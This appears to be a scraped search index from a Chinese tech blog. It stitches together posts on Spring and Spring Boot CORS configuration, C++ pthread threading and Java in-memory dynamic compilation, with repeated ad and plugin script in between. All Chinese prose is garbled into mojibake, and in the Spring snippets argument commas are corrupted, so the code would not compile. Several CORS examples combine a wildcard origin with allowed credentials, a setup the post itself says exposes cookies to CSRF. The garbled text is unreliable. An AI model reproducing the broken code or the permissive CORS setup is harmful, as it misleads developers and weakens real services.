id) { }} å¦‚æœåœ¨ Spring é¡¹ç›®é‡Œä½¿ç”¨äº† Spring Securityï¼Œè¯·ç¡®ä¿ Spring Security åœ¨å®‰å…¨çº§åˆ«å¯ç”¨ CORSï¼Œå¹¶å…è®¸å®ƒåˆ©ç”¨ Spring MVC çº§åˆ«çš„é…ç½®å®šä¹‰ 123456789@Configuration@EnableWebSecuritypublic class WebSecurityConfig extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.cors().and()... }} ä½¿ç”¨æ‹¦æˆªå™¨å®ç°è·¨åŸŸ123456789101112131415161718192021222324252627282930313233343536373839import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.HandlerInterceptor;import org.springframework.web.servlet.ModelAndView;import org.springframework.web.servlet.config.annotation.CorsRegistry;import org.springframework.web.servlet.config.annotation.InterceptorRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;@Configurationpublic class WebMvcConfig implements WebMvcConfigurer { @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(new HandlerInterceptor() { @Override public boolean preHandle(HttpServletRequest requestã€HttpServletResponse responseã€Object handler) throws Exception { response.addHeader("Access-Control-Allow-Origin"ã€"*"); response.setHeader("Access-Control-Allow-Credentials"ã€"true"); response.addHeader("Access-Control-Allow-Methods"ã€"GETã€POSTã€PUTã€DELETEã€OPTIONS"); response.addHeader("Access-Control-Allow-Headers"ã€"Content-Type,X-Requested-With,accept,Origin,Access-Control-Request-Method,Access-Control-Request-Headers,token"); return true; } @Override public void postHandle(HttpServletRequest requestã€HttpServletResponse responseã€Object handlerã€ModelAndView modelAndView) throws Exception { } @Override public void afterCompletion(HttpServletRequest requestã€HttpServletResponse responseã€Object handlerã€Exception ex) throws Exception { } }); }} ç”±äºè¯·æ±‚å¤´ä¸­è‡ªå®šä¹‰çš„å­—æ®µæ˜¯ä¸å…è®¸è·¨åŸŸçš„ï¼Œæ‰€ä»¥éœ€è¦æŒ‡å®šå…è®¸è·¨åŸŸçš„è‡ªå®šä¹‰ Headerï¼Œä¸Šè¿°çš„ä»£ç æ®µå¦‚ä¸‹ï¼š 1response.addHeader("Access-Control-Allow-Headers"ã€"Content-Type,X-Requested-With,accept,Origin,Access-Control-Request-Method,Access-Control-Request-Headers,token"); ä½¿ç”¨è¿‡æ»¤å™¨å®ç°è·¨åŸŸ123456789101112131415161718192021222324252627282930313233343536373839404142434445import org.springframework.stereotype.Component;import javax.servlet.*;import javax.servlet.annotation.WebFilter;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import java.io.IOException;@Component@WebFilter(urlPatterns = {"/*"}ã€filterName = "corsFilter")public class CorsFilter implements Filter { @Override public void doFilter(ServletRequest requestã€ServletResponse responseã€FilterChain chain) throws IOExceptionã€ServletException { HttpServletRequest req = (HttpServletRequest) request; HttpServletResponse rep = (HttpServletResponse) response; HttpSession session = req.getSession(); // è®¾ç½®å…è®¸è·¨åŸŸçš„æ¥æºåŸŸå rep.setHeader("Access-Control-Allow-Origin"ã€"*"); // è®¾ç½®å…è®¸è·¨åŸŸè¯·æ±‚ä¸­æ”¯æŒçš„HTTPè¯·æ±‚ç±»å‹ rep.setHeader("Access-Control-Allow-Methods"ã€"POSTã€GETã€PUTã€OPTIONSã€DELETEã€PATCH"); // è®¾ç½®è·¨åŸŸé¢„æ£€è¯·æ±‚çš„æœ‰æ•ˆæœŸï¼ˆç§’ï¼‰ rep.setHeader("Access-Control-Max-Age"ã€"3600"); // è®¾ç½®å…è®¸è·¨åŸŸçš„è¯·æ±‚å¤´å­—æ®µ rep.setHeader("Access-Control-Allow-Headers"ã€"tokenã€Originã€X-Requested-Withã€Content-Typeã€Accept"); // è®¾ç½®å…è®¸å°†æœ¬ç«™åŸŸåä¸‹çš„Cookieä¿¡æ¯æºå¸¦è‡³è·¨åŸŸæœåŠ¡å™¨ rep.setHeader("Access-Control-Allow-Credentials"ã€"true"); // å°†è·å–åˆ°çš„SessionIdé€šè¿‡Cookieè¿”å›ç»™å‰ç«¯ // rep.addCookie(new Cookie("JSSESIONID"ã€session.getId())); chain.doFilter(reqã€rep); } @Override public void init(FilterConfig arg0) throws ServletException { } @Override public void destroy() { }} (adsbygoogle = window.adsbygoogle || []).push({}); SpringBoot é…ç½®è·¨åŸŸ ç‰¹åˆ«æ³¨æ„ï¼šä¸Šè¿°ä»‹ç»çš„ Spring ä½¿ç”¨æ³¨è§£ã€æ‹¦æˆªå™¨ã€è¿‡æ»¤å™¨æ§åˆ¶è·¨åŸŸçš„æ–¹å¼ï¼ŒåŒæ ·é€‚ç”¨äº SpringBoot é¡¹ç›® SpringBoot 1.5 ç‰ˆæœ¬åœ¨ SpringBoot 1.5 ç‰ˆæœ¬é‡Œï¼Œå¯ä»¥ç»§æ‰¿ WebMvcConfigurerAdapter ç±»å¹¶å®ç° addCorsMappings() æŠ½è±¡æ–¹æ³• 1234567891011@Configurationpublic class WebMvcConfig extends WebMvcConfigurerAdapter { @Override public void addCorsMappings(CorsRegistry registry) { registry.addMapping("/**").allowedHeaders("*") .allowedMethods("*") .allowedOrigins("*") .allowCredentials(true); }} SpringBoot 2.0 ç‰ˆæœ¬åœ¨ SpringBoot 2.0 ç‰ˆæœ¬é‡Œï¼Œå¯ä»¥å®ç° WebMvcConfigurer æ¥å£å¹¶å®ç° addCorsMappings() æ–¹æ³• 1234567891011121314151617import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.config.annotation.CorsRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;@Configurationpublic class WebMvcConfig implements WebMvcConfigurer { @Override public void addCorsMappings(CorsRegistry registry) { registry.addMapping("/**") .allowedHeaders("Content-Type"ã€"X-Requested-With"ã€"accept,Origin"ã€"Access-Control-Request-Method"ã€"Access-Control-Request-Headers"ã€"token") .allowedMethods("*") .allowedOrigins("*") .allowCredentials(true); }} æ‰©å±•è¯´æ˜Nginx é…ç½®è·¨åŸŸ Nginx é…ç½®è·¨åŸŸ Access-Control-Max-Age å‚æ•°æµè§ˆå™¨çš„åŒæºç­–ç•¥ï¼Œå°±æ˜¯å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œæµè§ˆå™¨ä¼šé™åˆ¶ä»è„šæœ¬å‘èµ·çš„è·¨åŸŸ HTTP è¯·æ±‚ï¼ˆæ¯”å¦‚å¼‚æ­¥è¯·æ±‚ GETã€POSTã€PUTã€DELETEã€OPTIONS ç­‰ç­‰ï¼‰ï¼Œæ‰€ä»¥æµè§ˆå™¨ä¼šå‘æ‰€è¯·æ±‚çš„æœåŠ¡å™¨å‘èµ·ä¸¤æ¬¡è¯·æ±‚ï¼›ç¬¬ä¸€æ¬¡æ˜¯æµè§ˆå™¨ä½¿ç”¨ OPTIONS æ–¹æ³•å‘èµ·ä¸€ä¸ªé¢„æ£€è¯·æ±‚ï¼Œç¬¬äºŒæ¬¡æ‰æ˜¯çœŸæ­£çš„è¯·æ±‚ï¼›ç¬¬ä¸€æ¬¡çš„é¢„æ£€è¯·æ±‚è·çŸ¥æœåŠ¡å™¨æ˜¯å¦å…è®¸è¯¥è·¨åŸŸè¯·æ±‚ï¼šå¦‚æœå…è®¸ï¼Œæ‰å‘èµ·ç¬¬äºŒæ¬¡çœŸå®çš„è¯·æ±‚ï¼›å¦‚æœä¸å…è®¸ï¼Œåˆ™æ‹¦æˆªç¬¬äºŒæ¬¡è¯·æ±‚ã€‚Access-Control-Max-Age:3600ï¼ˆå•ä½ä¸ºç§’ï¼Œæœ‰æ•ˆæœŸä¸º 1 å°æ—¶ï¼‰è¡¨ç¤ºè¯¥é¢„æ£€è¯·æ±‚åœ¨å®¢æˆ·ç«¯ 1 å°æ—¶åè¿‡æœŸï¼Œå³ 1 å°æ—¶å†…å‘é€æ™®é€šè¯·æ±‚å°±ä¸ä¼šå†ä¼´éšç€å‘é€é¢„æ£€è¯·æ±‚ï¼Œè¿™æ ·å¯ä»¥å‡å°‘å¯¹æœåŠ¡å™¨çš„å‹åŠ›ï¼Œä½†æ˜¯æ—¶é—´ä¹Ÿä¸å®œè®¾ç½®å¤ªå¤§ï¼Œå°¤å…¶æ˜¯é¡¹ç›®é¢‘ç¹å‘å¸ƒç‰ˆæœ¬çš„é˜¶æ®µï¼ŒåŒæ—¶åˆä¿®æ”¹äº† Cors é…ç½®çš„åœºæ™¯ã€‚ resp.addHeader("Access-Control-Max-Age", "0")ï¼šè¡¨ç¤ºæ¯æ¬¡è¯·æ±‚éƒ½å‘èµ·é¢„æ£€è¯·æ±‚ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯æ¬¡éƒ½å‘é€ä¸¤æ¬¡è¯·æ±‚ resp.addHeader("Access-Control-Max-Age", "1800")ï¼šè¡¨ç¤ºæ¯éš” 30 åˆ†é’Ÿæ‰å‘èµ·ä¸€æ¬¡é¢„æ£€è¯·æ±‚ Access-Control-Allow-Credentials å‚æ•°å¦‚æœæœåŠ¡å™¨ç«¯è®¾ç½®äº† Access-Control-Allow-Credentials: trueï¼ŒåŒæ—¶æœåŠ¡å™¨ç«¯è¿˜è®¾ç½®äº† Access-Control-Allow-Origin: *ï¼Œé‚£å°±æ„å‘³å°† Cookie æš´éœ²ç»™äº†æ‰€æœ‰çš„ç½‘ç«™ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾å½“å‰æ˜¯ A ç½‘ç«™ï¼Œå¹¶ä¸”åœ¨ Cookie é‡Œå†™å…¥äº†èº«ä»½å‡­è¯ï¼Œç”¨æˆ·åŒæ—¶æ‰“å¼€äº† B ç½‘ç«™ï¼Œé‚£ä¹ˆ B ç½‘ç«™ç»™ A ç½‘ç«™çš„æœåŠ¡å™¨å‘çš„æ‰€æœ‰è¯·æ±‚éƒ½æ˜¯ä»¥ A ç”¨æˆ·çš„èº«ä»½è¿›è¡Œçš„ï¼Œè¿™å°†å¯¼è‡´ CSRF ç³»ç»Ÿå®‰å…¨é—®é¢˜ã€‚ å¸¸è§é—®é¢˜@CrossOrigin æ³¨è§£ä¸ç”Ÿæ•ˆ 1.Spring çš„ç‰ˆæœ¬è¦åœ¨ 4.2 æˆ–ä»¥ä¸Šç‰ˆæœ¬æ‰æ”¯æŒ @CrossOrigin æ³¨è§£ 2. å¹¶é @CrossOrigin æ²¡æœ‰è§£å†³è·¨åŸŸçš„é—®é¢˜ï¼Œè€Œæ˜¯ä¸æ­£ç¡®çš„è¯·æ±‚å¯¼è‡´æ— æ³•å¾—åˆ°é¢„æœŸçš„å“åº”ï¼Œæœ€ç»ˆä½¿æµè§ˆå™¨ç«¯æç¤ºè·¨åŸŸé”™è¯¯ï¼Œæ­¤æ—¶å»ºè®®æ£€æŸ¥ HTTP è¯·æ±‚çš„å“åº”çŠ¶æ€ç  3. åœ¨ Controller ç±»ä¸Šæ–¹æ·»åŠ  @CrossOrigin æ³¨è§£åï¼Œä»ç„¶å‡ºç°è·¨åŸŸé—®é¢˜ï¼Œè§£å†³æ–¹æ¡ˆä¹‹ä¸€å°±æ˜¯åœ¨æ–¹æ³•ä¸Šçš„ @RequestMapping æ³¨è§£ä¸­æŒ‡å®š GETã€POST ç­‰æ–¹å¼ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 123456789@CrossOrigin@RestControllerpublic class AccountController { @RequestMapping(method = RequestMethod.GET) public String add() { }} æ³¨è§£æ–¹å¼ä¸è¿‡æ»¤å™¨æ–¹å¼çš„é€‚ç”¨åœºæ™¯è¿‡æ»¤å™¨ / æ‹¦æˆªå™¨æ–¹å¼é€‚åˆäºå¤§èŒƒå›´çš„è·¨åŸŸæ§åˆ¶ï¼Œæ¯”å¦‚æŸä¸ª Controller ç±»çš„æ‰€æœ‰æ–¹æ³•å…¨éƒ¨æ”¯æŒæŸä¸ªæˆ–å‡ ä¸ªå…·ä½“çš„åŸŸåè·¨åŸŸè®¿é—®çš„åœºæ™¯ã€‚è€Œæ³¨è§£æ–¹å¼çš„ä¼˜åŠ¿åœ¨äºç»†ç²’åº¦çš„è·¨åŸŸæ§åˆ¶ï¼Œæ¯”å¦‚ä¸€ä¸ª Controller ç±»ä¸­ methodA æ”¯æŒåŸŸå originA è·¨åŸŸè®¿é—®ï¼ŒmethodB æ”¯æŒåŸŸå originB è·¨åŸŸè®¿é—®çš„æƒ…å†µï¼Œå½“ç„¶è¿‡æ»¤å™¨ / æ‹¦æˆªå™¨æ–¹å¼ä¹Ÿèƒ½å®ç°ï¼Œä½†é€‚ç”¨æ³¨è§£çš„æ–¹å¼èƒ½è½»æ¾å¾ˆå¤šï¼Œå°¤å…¶æ˜¯ä¸Šè¿°æƒ…å†µæ¯”è¾ƒå¤šçš„åœºæ™¯ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œ@CrossOrigin æ³¨è§£çš„åº•å±‚ä»£ç å¹¶ä¸æ˜¯åŸºäºæ‹¦æˆªå™¨æˆ–è€…è¿‡æ»¤å™¨æ¥å®ç°çš„ã€‚ å‚è€ƒåšå®¢ Spring å®˜æ–¹æ–‡æ¡£ @CrossOrigin æ³¨è§£è§£å†³è·¨åŸŸé—®é¢˜ CORS ä¸ @CrossOrigin æ³¨è§£åº•å±‚å®ç°è¯¦è§£ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"C++ å¼€å‘çŸ¥è¯†å›¾è°± (æœ€æ–°)",url:"/posts/87f5b84d.html",text:'C++ åŸºç¡€çŸ¥è¯† var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"çŸ¥è¯†å›¾è°±"},{title:"åŒºå—é“¾å¼€å‘çŸ¥è¯†å›¾è°± (æœ€æ–°)",url:"/posts/d5d6425c.html",text:'åŒºå—é“¾å¼€å‘æŠ€æœ¯ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"çŸ¥è¯†å›¾è°±"},{title:"Python å¼€å‘çŸ¥è¯†å›¾è°± (æœ€æ–°)",url:"/posts/3c42fe19.html",text:'Python å°±ä¸šæ–¹å‘ Python å¼€å‘æŠ€æœ¯ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"çŸ¥è¯†å›¾è°±"},{title:"Linux ç³»ç»Ÿç¼–ç¨‹ä¹‹å›› C++ å¤šçº¿ç¨‹",url:"/posts/841eca80.html",text:'æŸ¥çœ‹ pthread.h çš„ä½ç½®åœ¨ Linux ç³»ç»Ÿé‡Œï¼Œpthread.h å¤´æ–‡ä»¶çš„ä½ç½®ä¸€èˆ¬æ˜¯ /usr/include/pthread.hï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å¤´æ–‡ä»¶çš„ä½ç½® 1# whereis pthread.h åŸºäº pthread å¤šçº¿ç¨‹ç¼–ç¨‹æ¡ˆä¾‹ä»£ç 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;using namespace std;void printids(const char *s) { pid_t pid = getpid(); pthread_t tid = pthread_self(); printf("%s pid %u tid %u (0x%x)\\n", s, (unsigned int) pid, (unsigned int) tid, (unsigned int) tid);}void *thr_fn(void *args) { printids("new thread: "); return ((void *) 0);}int main() { pthread_t ntid; int err = pthread_create(&amp;ntid, NULL, thr_fn, NULL); if (err != 0) { printf("can\'t create thread: %d\\n", err); exit(1); } printids("main thread: "); sleep(1); return 0;} ç¼–è¯‘ä»£ç ç”±äº pthread ä¸æ˜¯ Linux ç³»ç»Ÿé»˜è®¤çš„åº“ï¼Œå› æ­¤é“¾æ¥æ—¶éœ€è¦ä½¿ç”¨é™æ€åº“ libpthread.aã€‚ç®€è€Œè¨€ä¹‹ï¼Œåœ¨ä½¿ç”¨ pthread_create() åˆ›å»ºçº¿ç¨‹ï¼Œä»¥åŠè°ƒç”¨ pthread_atfork() å‡½æ•°å»ºç«‹ fork å¤„ç†ç¨‹åºæ—¶ï¼Œéœ€è¦é€šè¿‡ -lpthread å‚æ•°é“¾æ¥è¯¥åº“ï¼ŒåŒæ—¶è¿˜éœ€è¦åœ¨ C++ æºæ–‡ä»¶é‡Œæ·»åŠ å¤´æ–‡ä»¶ pthread.hã€‚ æç¤º ä¸ºäº†å¯ä»¥æ­£å¸¸ç¼–è¯‘ä½¿ç”¨äº† pthread çš„é¡¹ç›®ä»£ç ï¼Œä¸åŒæ„å»ºå·¥å…·çš„ä½¿ç”¨è¯´æ˜å¦‚ä¸‹ï¼š è‹¥ä½¿ç”¨ G++ ç¼–è¯‘ C++ é¡¹ç›®ï¼Œåˆ™ç¼–è¯‘å‘½ä»¤çš„ç¤ºä¾‹å¦‚ä¸‹ï¼š 12# ç¼–è¯‘ä»£ç $ g++ main.cpp -o main -lpthread è‹¥ä½¿ç”¨ CMake æ„å»º C++ é¡¹ç›®ï¼Œåˆ™ CMakeLists.txt é…ç½®æ–‡ä»¶çš„ç¤ºä¾‹å†…å®¹å¦‚ä¸‹ï¼š 123set(CMAKE_CXX_FLAGS "-std=c++11 -lpthread")add_executable(main main.cpp) ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12main thread: pid 6189 tid 342021952 (0x1462d740)new thread: pid 6189 tid 324765440 (0x135b8700) var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ linuxç³»ç»Ÿç¼–ç¨‹"},{title:"Java åŠ¨æ€ç¼–è¯‘çš„å®ç°",url:"/posts/b8943243.html",text:'å‰è¨€æœ¬æ–‡ä¸»è¦ä»‹ç»å¦‚ä½•å®ç° Java çš„åŠ¨æ€ç¼–è¯‘ï¼Œå¹¶ç»™å‡ºå¿«é€Ÿå…¥é—¨æ¡ˆä¾‹ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ å¿«é€Ÿå…¥é—¨ç¼–å†™æ¥å£12345678910package com.clay.domain;/** * @author clay */public interface Store { public void sell();} 12345678910111213package com.clay.domain;/** * @author clay */public class Supermarket implements Store { @Override public void sell() { System.out.println("invoke supermarket sell method"); }} ç¼–å†™å·¥å…·ç±»1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586package com.clay.loader;import javax.tools.JavaCompiler;import javax.tools.JavaFileObject;import javax.tools.StandardJavaFileManager;import javax.tools.ToolProvider;import java.io.IOException;import java.net.URL;import java.net.URLClassLoader;import java.util.*;/** * åŠ¨æ€åŠ è½½å™¨ * * @author clay */public class DynamicLoader { /** * ç¼–è¯‘å‚æ•° */ private List&lt;String&gt; options = new ArrayList&lt;&gt;(); /** * æ·»åŠ ç¼–è¯‘å‚æ•° * * @param key * @param value * @throws NullPointerException */ public void addOption(String key, String value) throws NullPointerException { if (key == null || key.isEmpty()) { throw new NullPointerException("Option key is empty"); } options.add(key); options.add(value); } /** * é€šè¿‡Javaæ–‡ä»¶åå’Œå…¶ä»£ç ï¼Œç¼–è¯‘å¾—åˆ°å­—èŠ‚ç ï¼Œè¿”å›ç±»ååŠå…¶å¯¹åº”ç±»çš„å­—èŠ‚ç ï¼Œå°è£…äºMapä¸­ï¼Œ * å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå¹³å¸¸ç±»ä¸­å°±ç¼–è¯‘å‡ºæ¥çš„å­—èŠ‚ç åªæœ‰ä¸€ä¸ªç±»ï¼Œä½†æ˜¯è€ƒè™‘åˆ°å†…éƒ¨ç±»çš„æƒ…å†µï¼Œ ä¼šå‡ºç°å¾ˆå¤šä¸ªç±»ååŠå…¶å­—èŠ‚ç ï¼Œæ‰€ä»¥ç”¨Mapå°è£…æ–¹ä¾¿ * * @param javaName Javaæ–‡ä»¶åï¼Œä¾‹å¦‚Student.java * @param javaCode Javaæºç  * @return map */ public Map&lt;String, byte[]&gt; compile(String javaName, String javaCode) { JavaCompiler compiler = ToolProvider.getSystemJavaCompiler(); StandardJavaFileManager stdManager = compiler.getStandardFileManager(null, null, null); try (MemoryJavaFileManager manager = new MemoryJavaFileManager(stdManager)) { JavaFileObject javaFileObject = manager.makeStringSource(javaName, javaCode); JavaCompiler.CompilationTask task = compiler.getTask(null, manager, null, options, null, Arrays.asList(javaFileObject)); if (task.call()) { return manager.getClassBytes(); } } catch (IOException e) { e.printStackTrace(); } return null; } /** * å…ˆæ ¹æ®ç±»ååœ¨å†…å­˜ä¸­æŸ¥æ‰¾æ˜¯å¦å·²å­˜åœ¨è¯¥ç±»ï¼Œè‹¥ä¸å­˜åœ¨åˆ™è°ƒç”¨URLClassLoader.defineClass()æ–¹æ³•åŠ è½½è¯¥ç±» * URLClassLoaderçš„å…·ä½“ä½œç”¨å°±æ˜¯å°†Classæ–‡ä»¶åŠ è½½åˆ°JVMè™šæ‹Ÿæœºä¸­ */ public static class MemoryClassLoader extends URLClassLoader { private Map&lt;String, byte[]&gt; classBytes = new HashMap&lt;String, byte[]&gt;(); public MemoryClassLoader(Map&lt;String, byte[]&gt; classBytes) { super(new URL[0], MemoryClassLoader.class.getClassLoader()); this.classBytes.putAll(classBytes); } @Override protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException { byte[] buf = this.classBytes.get(name); if (buf == null) { return super.findClass(name); } this.classBytes.remove(name); return defineClass(name, buf, 0, buf.length); } }} 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132package com.clay.loader;import javax.tools.*;import java.io.*;import java.net.URI;import java.nio.CharBuffer;import java.util.HashMap;import java.util.Map;/** * å°†ç¼–è¯‘å¥½çš„Classæ–‡ä»¶ä¿å­˜åˆ°å†…å­˜å½“ä¸­ï¼Œè¿™é‡Œçš„å†…å­˜ä¹Ÿå°±æ˜¯Mapæ˜ å°„å½“ä¸­ * * @author clay */public final class MemoryJavaFileManager extends ForwardingJavaFileManager { /** * ç”¨äºå­˜æ”¾Classæ–‡ä»¶çš„å†…å­˜ */ private Map&lt;String, byte[]&gt; classBytes; /** * Javaæºæ–‡ä»¶çš„æ‰©å±•å */ private final static String EXT = ".java"; public MemoryJavaFileManager(JavaFileManager fileManager) { super(fileManager); classBytes = new HashMap&lt;String, byte[]&gt;(); } public Map&lt;String, byte[]&gt; getClassBytes() { return classBytes; } @Override public void close() throws IOException { classBytes = new HashMap&lt;String, byte[]&gt;(); } @Override public void flush() throws IOException { } @Override public JavaFileObject getJavaFileForOutput( JavaFileManager.Location location, String className, JavaFileObject.Kind kind, FileObject sibling) throws IOException { if (kind == JavaFileObject.Kind.CLASS) { return new ClassOutputBuffer(className); } else { return super.getJavaFileForOutput(location, className, kind, sibling); } } public JavaFileObject makeStringSource(String name, String code) { return new StringInputBuffer(name, code); } public static URI toURI(String name) { File file = new File(name); if (file.exists()) { return file.toURI(); } else { try { final StringBuilder newUri = new StringBuilder(); newUri.append("mfm:///"); newUri.append(name.replace(\'.\', \'/\')); if (name.endsWith(EXT)) { newUri.replace(newUri.length() - EXT.length(), newUri.length(), EXT); } return URI.create(newUri.toString()); } catch (Exception exp) { return URI.create("mfm:///com/sun/script/java/java_source"); } } } /** * ä¸€ä¸ªæ–‡ä»¶å¯¹è±¡ï¼Œç”¨æ¥è¡¨ç¤ºä»Stringä¸­è·å–åˆ°çš„Sourceï¼Œä»¥ä¸‹å†…å®¹æ˜¯æŒ‰ç…§JDKç»™å‡ºçš„ä¾‹å­å†™çš„ */ private static class StringInputBuffer extends SimpleJavaFileObject { private final String code; /** * @param name æ­¤æ–‡ä»¶å¯¹è±¡è¡¨ç¤ºçš„ç¼–è¯‘å•å…ƒçš„name * @param code æ­¤æ–‡ä»¶å¯¹è±¡è¡¨ç¤ºçš„ç¼–è¯‘å•å…ƒsourceçš„code */ StringInputBuffer(String name, String code) { super(toURI(name), Kind.SOURCE); this.code = code; } @Override public CharBuffer getCharContent(boolean ignoreEncodingErrors) { return CharBuffer.wrap(code); } public Reader openReader() { return new StringReader(code); } } /** * å°†Javaå­—èŠ‚ç å­˜å‚¨åˆ°classBytesæ˜ å°„ä¸­çš„æ–‡ä»¶å¯¹è±¡ */ private class ClassOutputBuffer extends SimpleJavaFileObject { private String name; ClassOutputBuffer(String name) { super(toURI(name), Kind.CLASS); this.name = name; } @Override public OutputStream openOutputStream() { return new FilterOutputStream(new ByteArrayOutputStream()) { @Override public void close() throws IOException { out.close(); ByteArrayOutputStream bos = (ByteArrayOutputStream) out; // è¿™é‡Œå¯èƒ½éœ€è¦ä¿®æ”¹ classBytes.put(name, bos.toByteArray()); } }; } }} ç¼–å†™æµ‹è¯•ç±»12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package com.clay.loader;import com.clay.domain.Store;import com.clay.domain.Supermarket;import org.springframework.util.Assert;import java.lang.reflect.Constructor;import java.util.Map;/** * @author clay */public class ProxyUtil { /** * è·å–Javaä»£ç  * * @return */ public String getJavaCode() { String rt = "\\r\\n"; // è¿™é‡Œå®šä¹‰çš„Javaç±»ä»£ç é‡Œï¼Œå»ºè®®é¦–è¡Œä¸è¦å¸¦åŒ…åï¼Œå¦åˆ™å®¹æ˜“å‡ºç°ç¼–è¯‘å¤±è´¥çš„é—®é¢˜ String code = "import com.clay.domain.Store;" + rt + "public class Dealer implements Store" + rt + "{" + rt + "private Store s;" + rt + "public Dealer(Store s)" + rt + " {" + " this.s = s;" + rt + " }" + rt + "@Override" + rt + "public void sell()" + " {" + rt + "System.out.println(\\"invoke dealer sell method\\");" + rt + "s.sell();" + rt + " }" + rt + "}"; return code; } /** * åŠ¨æ€ç¼–è¯‘ * * @throws Exception */ public void handle() throws Exception { String javaName = "Dealer.java"; // å¯¹Javaä»£ç è¿›è¡Œç¼–è¯‘ï¼Œå¹¶å°†ç”ŸæˆClassæ–‡ä»¶å­˜æ”¾åœ¨Mapä¸­ DynamicLoader dynamicLoader = new DynamicLoader(); Map&lt;String, byte[]&gt; bytecode = dynamicLoader.compile(javaName, getJavaCode()); // åŠ è½½å­—èŠ‚ç åˆ°è™šæ‹Ÿæœºä¸­ DynamicLoader.MemoryClassLoader classLoader = new DynamicLoader.MemoryClassLoader(bytecode); Class&lt;?&gt; clazz = classLoader.loadClass("Dealer"); Assert.notNull(clazz, ""); // é€šè¿‡åå°„è¿›è¡Œè°ƒç”¨ Constructor constructor = clazz.getConstructor(Store.class); Store store = (Store) constructor.newInstance(new Supermarket()); store.sell(); }} 